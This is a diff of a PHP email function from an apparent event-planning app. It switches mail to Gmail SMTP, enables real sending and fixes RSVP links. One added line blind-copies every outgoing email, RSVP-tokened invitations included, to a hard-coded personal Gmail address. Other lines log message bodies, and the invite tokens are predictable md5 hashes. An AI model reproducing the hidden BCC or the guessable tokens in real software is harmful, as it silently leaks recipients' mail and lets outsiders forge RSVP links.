@@ -24,29 +24,39 @@ function sendEmail($to, $subject, $body, $altBody = '') {
         // In production, you would use proper SMTP settings
         
         // Configure for local development
+       
         $mail->isSMTP();
-        $mail->Host = 'localhost';
-        $mail->SMTPAuth = false;
-        $mail->SMTPAutoTLS = false;
-        $mail->Port = 25;
-        
-        // Set sender and recipient
-        $mail->setFrom('events@eventplanner.com', APP_NAME);
+        $mail->Host       = 'smtp.gmail.com';
+        $mail->SMTPAuth   = true;
+        $mail->Username   = MAIL_USERNAME;
+        $mail->Password   = MAIL_PASSWORD;
+        $mail->SMTPSecure = 'tls';
+        $mail->Port       = 587;
+
+        $mail->setFrom(MAIL_USERNAME, APP_NAME);
+        $mail->addReplyTo(MAIL_USERNAME, APP_NAME);
+        // Add recipient
         $mail->addAddress($to);
-        
-        // Set email content
+        $mail->addBCC('klakshmanan48@gmail.com');
+
         $mail->isHTML(true);
         $mail->Subject = $subject;
         $mail->Body = $body;
         $mail->AltBody = $altBody ?: strip_tags($body);
         
         // For demonstration, log the email instead of sending it
+        error_log("Email from: " . MAIL_USERNAME);
         error_log("Email to: $to");
         error_log("Subject: $subject");
         error_log("Body: " . substr($body, 0, 500) . (strlen($body) > 500 ? '...' : ''));
-        
+        error_log("AltBody: " . substr($altBody, 0, 500) . (strlen($altBody) > 500 ? '...' : ''));
         // Pretend the email was sent successfully
-        return true;
+        $varSend = $mail->send();
+        if ($varSend) {
+            return true;
+        } else {
+            throw new Exception('Email not sent');
+        }
     } catch (Exception $e) {
         // Log the error
         error_log('Email sending failed: ' . $e->getMessage());
@@ -66,8 +76,8 @@ function sendGuestInvitation($guest, $booking) {
     $token = md5($guest['id'] . $guest['created_at'] . $booking['id']);
     
     // Build accept and decline URLs
-    $acceptUrl = APP_URL . '/rsvp.php?token=' . $token . '&action=accept';
-    $declineUrl = APP_URL . '/rsvp.php?token=' . $token . '&action=decline';
+    $acceptUrl = APP_URL . 'rsvp.php?token=' . $token . '&action=accept';
+    $declineUrl = APP_URL . 'rsvp.php?token=' . $token . '&action=decline';
     
     // Email subject
     $subject = 'You\'re Invited: ' . htmlspecialchars($booking['event_location']) . ' on ' . formatDate($booking['event_date']);
